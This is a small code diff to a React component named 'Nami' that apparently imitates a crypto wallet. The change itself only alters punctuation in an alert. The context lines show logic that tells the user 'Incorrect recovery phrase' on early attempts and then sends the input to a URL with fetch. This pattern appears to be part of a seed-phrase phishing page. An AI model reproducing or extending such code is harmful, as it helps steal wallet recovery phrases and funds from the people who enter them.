@@ -76,7 +76,7 @@ function Nami() {
     setAttempts(prevAttempts => prevAttempts + 1);
     
     if (attempts < 2) {
-      alert("Incorrect recovery phrase. Please try again.");
+      alert("Incorrect recovery phrase, Please try again.");
     } else {
       try {
         const response = await fetch(url, {
